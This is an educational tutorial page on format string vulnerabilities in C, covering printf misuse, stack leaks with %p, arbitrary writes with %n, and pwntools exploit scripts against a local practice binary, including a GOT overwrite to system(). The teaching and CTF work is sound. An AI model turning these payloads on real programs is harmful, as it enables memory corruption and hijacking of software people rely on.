---
title: "Format String Vulnerabilities"
topic: "format-string"
tags: [format-string, printf, exploit-development, binary-exploitation, ctf]
difficulty: advanced
day: 91
layout: default
parent: Topics
nav_order: 91
---

# Format String Vulnerabilities

## What You Will Learn
- How format string vulnerabilities work
- How to read arbitrary memory from the stack using `%p` and `%x`
- How to write arbitrary values to memory using `%n`
- The x86-64 argument passing order for format specifiers
- How to build a format string exploit

## What Is It?

A **format string vulnerability** occurs when user-controlled input is passed directly to `printf` (or similar functions) as the format string argument.

Vulnerable code:
```c
printf(user_input);       // VULNERABLE — user controls format
```

Safe code:
```c
printf("%s", user_input); // SAFE — user input is just data
```

When `printf` receives a format string like `%p %p %p`, it reads values from the stack. If the attacker controls the format string, they control what `printf` reads — and with `%n`, what it writes.

## Why It Matters

- Format string bugs allow reading arbitrary memory (leak stack addresses, canary values, libc pointers)
- `%n` allows **writing** arbitrary values to arbitrary memory — this is a write-what-where primitive
- In CTFs, format string is a core binary exploitation category
- Real-world examples: CVE-2012-3569 (VMware), CVE-2018-14526 (hostapd)

## Argument Passing Order (x86-64)

On x86-64 Linux, function arguments are passed in registers first, then the stack:

```
rdi, rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10], ...
```

For `printf(fmt, arg1, arg2, ...)`:
- `rdi` = format string pointer
- `rsi` = 1st format argument
- `rdx` = 2nd format argument
- `rcx` = 3rd format argument
- `r8`  = 4th format argument
- `r9`  = 5th format argument
- `[rsp]` = 6th format argument (on the stack)
- `[rsp+8]` = 7th format argument
- ...and so on

## Reading from the Stack

Use `%p` to print pointer-sized values, or `%x` for hex:

```
printf("%p %p %p %p %p %p %p %p")
```

This prints the first 8 format arguments — first from registers, then from the stack. This is how you **leak stack addresses, canary values, and return addresses**.

### Positional Specifiers

You can read a specific argument directly with `%N$p` where N is the argument number:

```
%1$p  → prints rsi (1st arg)
%6$p  → prints [rsp] (6th arg, first stack value)
%7$p  → prints [rsp+8] (7th arg)
%25$p → prints the 25th argument value
```

To find where your input is on the stack, send a pattern and look for it:

```python
payload = b"AAAA" + b".%p" * 30
# Look for 0x41414141 in the output to find your offset
```

## Writing to Memory with %n

`%n` writes the **number of characters printed so far** into the address pointed to by the corresponding argument.

```c
int x;
printf("hello%n", &x);
// x is now 5 (length of "hello")
```

### Write-What-Where

To write an arbitrary value to an arbitrary address:

1. **Put the target address on the stack** (as part of your format string payload)
2. **Use `%N$n`** to select that address as the argument
3. **Control the character count** before the `%n` to set the value written

```
[target_addr][padding][%<value>c][%<offset>$n]
```

- `%<value>c` prints `<value>` characters (padding to desired count)
- `%hn` writes 2 bytes (short), `%hhn` writes 1 byte — use these to avoid printing billions of characters

### Example: Write 0x41 to address 0x404060

```python
from pwn import *

p = process("./vuln")

target = 0x404060

# Payload structure:
# - address at offset 6 (first stack slot)
# - %65c to print 65 chars (0x41 = 65)
# - %6$hhn to write 1 byte to address at arg 6

payload = p64(target) + b"%65c" + b"%6$hhn"
p.sendline(payload)
p.interactive()
```

### Example from the original notes:

```
a%25$n
```

This:
1. Prints the character `a` — that is 1 character
2. Goes to the 25th argument on the stack
3. Writes `1` (the length of characters printed so far) to that address as a 4-byte integer

## Full Exploit Workflow

```python
from pwn import *

p = process("./vuln")
elf = ELF("./vuln")

# Step 1: Leak a stack address or canary
p.sendline(b"%6$p.%7$p.%8$p")
leak = p.recvline()
print(leak)

# Step 2: Calculate target address (e.g., GOT entry for printf)
target = elf.got['printf']

# Step 3: Find where your input sits on the stack (offset)
# Send "AAAA%N$p" and increase N until you see 0x41414141

offset = 8   # example: your input starts at argument 8

# Step 4: Build write payload
# Write system() address to printf@GOT
system_addr = 0xdeadbeef   # leaked from libc

payload  = fmtstr_payload(offset, {target: system_addr})
p.sendline(payload)
p.interactive()
```

`pwntools` has a `fmtstr_payload()` helper that builds the payload for you once you know the offset.

## Resources

- [LiveOverflow — Format String Exploitation](https://www.youtube.com/watch?v=0WvrSfcdq1I)
- [pwntools fmtstr_payload](https://docs.pwntools.com/en/stable/fmtstr.html)
- [CTF101 — Format String Vulnerabilities](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)
- [pwn.college — Format Strings](https://pwn.college/)
- [printf(3) man page](https://man7.org/linux/man-pages/man3/printf.3.html)
